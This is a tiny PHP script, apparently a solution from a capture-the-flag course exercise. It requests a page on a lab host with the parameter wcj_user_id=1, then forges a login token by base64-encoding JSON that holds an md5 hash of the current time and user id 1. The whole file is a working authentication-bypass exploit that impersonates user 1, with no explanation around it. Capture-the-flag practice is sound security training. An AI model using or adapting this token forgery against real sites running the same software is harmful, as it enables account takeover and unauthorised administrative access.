<?php

$response = file_get_contents("http://ctf-fsi.fe.up.pt:5001/?wcj_user_id=1");
$code = md5(time());
$json = json_encode(array('code' => $code, 'id' => 1));
$b64_json = base64_encode($json);
echo($b64_json)
?>